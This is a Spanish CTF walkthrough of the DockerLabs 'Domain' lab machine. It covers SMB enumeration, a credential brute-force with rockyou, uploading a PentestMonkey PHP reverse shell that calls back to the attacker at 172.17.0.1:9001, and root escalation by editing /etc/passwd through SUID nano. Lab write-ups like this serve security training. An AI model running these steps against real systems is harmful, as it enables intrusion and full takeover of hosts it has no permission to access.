Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Medium
- Tags: #bruteforce #samba #reverse-shell #suid

![](assets/Pasted%20image%2020260106110127.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=2.71 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.712/2.712/2.712/0.000 ms
```

Ahora tiro un escaneo para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2 -oG allPorts

Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

- Puerto 80 HTTP y 139, 445 Samba

Sobre los puertos abiertos tiro un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ sudo nmap -p 80,139,445 -sV -sC -Pn -n -sS -vvv 172.17.0.2 -oN target

PORT    STATE SERVICE     REASON         VERSION
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 21783/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19706/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58197/udp): CLEAN (Failed to receive data)
|   Check 4 (port 60819/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-01-06T17:03:38
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

- Puerto 80 HTTP: Apache httpd 2.4.52
- Puertos 139, 445: Samba smbd 4

## Enumeración

### Puerto 80 HTTP

Al parecer es una pagina informativa sobre los servicios Samba y SMB.

![](assets/Pasted%20image%2020260106110408.png)

**Tecnologias Web.**

Tirándole un curl y viendo sus headers podemos ver que corre sobre Apache.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ curl -I http://172.17.0.2/

HTTP/1.1 200 OK
Date: Tue, 06 Jan 2026 17:07:28 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Thu, 11 Apr 2024 08:21:43 GMT
ETag: "728-615cdd86153c0"
Accept-Ranges: bytes
Content-Length: 1832
Vary: Accept-Encoding
Content-Type: text/html
```

### Puerto 139, 445 Samba

Enumere usuarios utilizando `netexec` 

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ nxc smb 172.17.0.2 --users
SMB         172.17.0.2      445    E48DD6C17D46     [*] Unix - Samba (name:E48DD6C17D46) (domain:E48DD6C17D46) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    E48DD6C17D46     -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.17.0.2      445    E48DD6C17D46     james                         2024-04-11 08:03:59 0
SMB         172.17.0.2      445    E48DD6C17D46     bob                           2024-04-11 08:04:09 0
SMB         172.17.0.2      445    E48DD6C17D46     [*] Enumerated 2 local users: E48DD6C17D46
```

- Podemos ver 2 usuarios: bob y james.

Alternativamente a `netexec` podemos utilizar `enum4linux` para enumerar todo el servicio Samba y obtener usuarios.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ enum4linux 172.17.0.2

 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc:
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc:

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]
```

- Mismos usuarios los cuales metí a una lista **users.txt**.

Siempre es bueno tratar de enumera los shares haciendo uso de una Null Session, aveces podemos encontrarnos con recursos a los que tenemos acceso de lectura o escritura.

- En este caso no tenemos ningún permiso ni acceso a ninguno de los shares.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ nxc smb 172.17.0.2 -u '' -p '' --shares

SMB         172.17.0.2      445    E48DD6C17D46     [*] Unix - Samba (name:E48DD6C17D46) (domain:E48DD6C17D46) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    E48DD6C17D46     [+] E48DD6C17D46\:
SMB         172.17.0.2      445    E48DD6C17D46     [*] Enumerated shares
SMB         172.17.0.2      445    E48DD6C17D46     Share           Permissions     Remark
SMB         172.17.0.2      445    E48DD6C17D46     -----           -----------     ------
SMB         172.17.0.2      445    E48DD6C17D46     print$                          Printer Drivers
SMB         172.17.0.2      445    E48DD6C17D46     html                            HTML Share
SMB         172.17.0.2      445    E48DD6C17D46     IPC$                            IPC Service (e48dd6c17d46 server (Samba, Ubuntu))
```

## Explotación

Sin tener mucha mas informacion mas que 2 usuarios opte por realizar un ataque de Fuerza Bruta al servicio Samba.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ nxc smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding

SMB         172.17.0.2      445    E48DD6C17D46     [-] E48DD6C17D46\james:star STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    E48DD6C17D46     [+] E48DD6C17D46\bob:star
```

- Se encontraron las credenciales bob/star.

Ahora que tengo credenciales puedo enumera los shares a los que tengo acceso.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ nxc smb 172.17.0.2 -u bob -p star --shares

SMB         172.17.0.2      445    E48DD6C17D46     [*] Unix - Samba (name:E48DD6C17D46) (domain:E48DD6C17D46) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    E48DD6C17D46     [+] E48DD6C17D46\bob:star
SMB         172.17.0.2      445    E48DD6C17D46     [*] Enumerated shares
SMB         172.17.0.2      445    E48DD6C17D46     Share           Permissions     Remark
SMB         172.17.0.2      445    E48DD6C17D46     -----           -----------     ------
SMB         172.17.0.2      445    E48DD6C17D46     print$          READ            Printer Drivers
SMB         172.17.0.2      445    E48DD6C17D46     html            READ,WRITE      HTML Share
SMB         172.17.0.2      445    E48DD6C17D46     IPC$                            IPC Service (e48dd6c17d46 server (Samba, Ubuntu))
```

- Permisos de lectura en print$ y permisos de lectura y escritura en **html**.

Me conecto al recurso **html** y me bajo encuentro con un único archivo **index.html** el cual me descargo.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ smbclient //172.17.0.2/html -U bob
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan  6 17:13:43 2026
  ..                                  D        0  Thu Apr 11 08:18:47 2024
  index.html                          N     1832  Thu Apr 11 08:21:43 2024

                12087176 blocks of size 1024. 8867524 blocks available
smb: \> get index.html
getting file \index.html of size 1832 as index.html (1788.9 KiloBytes/sec) (average 1789.1 KiloBytes/sec)
```

Al ver el archivo nos damos cuenta que corresponde al **index.html** de la pagina web, por lo cual el recurso puede estar montado en el directorio raíz de la web..

- Mismo texto que la pagina web:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ cat index.html

<body>
    <div class="container">
        <h1>¿Qué es Samba?</h1>
        <p>Samba es una implementación de software libre del protocolo de archivos compartidos de Microsoft Windows para sistemas operativos tipo Unix. Permite que sistemas operativos Unix compartan archivos e impresoras en una red de área local utilizando el protocolo SMB/CIFS.</p>

        <h2>¿Para qué sirve Samba?</h2>
        <p>Samba es útil en entornos donde hay una mezcla de sistemas operativos, incluidos Windows y sistemas basados en Unix como Linux o macOS. Con Samba, los usuarios de Windows pueden acceder a archivos y recursos compartidos en servidores Unix, y viceversa.</p>

        <p>Además de compartir archivos, Samba también puede actuar como un controlador de dominio en redes Windows, proporcionando autenticación y servicios de directorio.</p>

        <p>En resumen, Samba es una herramienta fundamental para la interoperabilidad entre sistemas Windows y Unix en redes empresariales y domésticas.</p>
    </div>
</body>
</html>
```

Podemos probar esto subiendo un archivo de prueba al recurso **html** para ver si lo podemos visualizar desde web.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ cat test.txt
prueba
```

Lo subimos al Samba

```bash
smb: \> put test.txt
putting file test.txt as \test.txt (6.8 kB/s) (average 6.8 kB/s)
```

Tirándole un curl o viéndolo desde el navegador podemos ver que en efecto el recurso esta montado en el directorio raíz de la web y todo lo que subamos lo podremos ver desde la misma web.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ curl http://172.17.0.2/test.txt
prueba
```

Ahora puedo tratar de subir una reverse-shell para conseguir acceso a la maquina. Yo utilice la siguiente: [PentestMonkeyPHPRevSh](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```bash

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ cat php-reverse-shell.php
<?php

$VERSION = "1.0";
$ip = '172.17.0.1';  // CHANGE THIS
$port = 9001;       // CHANGE THIS

```

Nos ponemos en escucha por el puerto 9001.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ sudo nc -nlvp 9001
listening on [any] 9001 ...
```

Subimos la reverse-shell al Samba.

```bash
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (2682.0 kB/s) (average 1790.4 kB/s)
```

Tiramos una petición a la web para ejecutar nuestra reverse-shell.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ curl http://172.17.0.2/php-reverse-shell.php
```

Y recibimos conexión.

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34104
Linux e48dd6c17d46 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 x86_64 x86_64 GNU/Linux
 18:19:58 up 27 min,  0 users,  load average: 0.10, 1.88, 1.95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
## Escalada de Privilegios

Por los directorios `home` y el `/etc/passwd` podemos ver 2 usuarios.

- bob y james.

```bash
www-data@e48dd6c17d46:/$ cd home
www-data@e48dd6c17d46:/home$ ls
bob  james
www-data@e48dd6c17d46:/home$ grep "sh" /etc/passwd
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
```

Puedo reutilizar la credencial del servicio Samba para el usuario bob.

- bob/star

```bash
www-data@e48dd6c17d46:/home$ su bob
Password:
bob@e48dd6c17d46:/home$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob)
```

Ahora procedí a enumerar binarios con el bit SUID del usuario root.

```bash
bob@e48dd6c17d46:/$ find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/nano
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

- Destaca: /usr/bin/nano

Que nano se ejecute como el usuario root nos indica que podemos modificar y leer archivos privilegiados del sistema. En mi caso voy a editar el `/etc/passwd` para meter un nuevo usuario con privilegios de root.

Primero tengo que generar una contraseña para el usuario.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/domain]
└─$ openssl passwd -1 pepe

$1$D60iH17a$zbOnG9coiH1rF1lzuDZed1
```

Modifico el **/etc/passwd** para agregar mi nuevo usuario.

```bash
bob@e48dd6c17d46:/$ nano /etc/passwd

wndr:$1$D60iH17a$zbOnG9coiH1rF1lzuDZed1:0:0::/root:/bin/bash
```

Migro al nuevo usuario y soy root.

```bash
bob@e48dd6c17d46:/$ su wndr
Password:
root@e48dd6c17d46:/# id
uid=0(root) gid=0(root) groups=0(root)
```

***PWNED***